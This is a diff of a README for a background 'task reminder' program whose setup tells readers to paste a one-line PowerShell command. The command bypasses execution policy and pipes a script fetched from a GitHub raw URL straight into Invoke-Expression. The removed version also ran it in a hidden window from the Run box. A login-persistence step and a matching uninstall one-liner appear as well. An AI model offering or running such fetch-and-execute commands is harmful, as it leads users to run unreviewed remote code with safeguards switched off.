@@ -4,10 +4,10 @@ No installation or prerequisites are needed. The program runs in the background.
 
 ## Setup
 
-Execute the following one-line install command in the windows quickstart menu which can be accessed via the keyboard shortcut **Win + R**:
+Execute the following one-line install command in the windows powershell:
 
 ```
-%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1' | iex"
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; irm 'https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1' | iex
 ```
 
 ### Logging
@@ -18,7 +18,7 @@ Logs are stored at ***%TEMP%\TaskReminder\log.txt***
 This script creates a helpful system that boots the program on login, this is not dissimilar to many other software solutions. To remove this functionality utilise the following procedure through quickstart.
 
 ```
-%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/Kiyan-7/telaviv/main/uninstall.ps1' | iex"
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; irm 'https://raw.githubusercontent.com/Kiyan-7/telaviv/main/uninstall.ps1' | iex
 ```
 
 ## Disclaimer
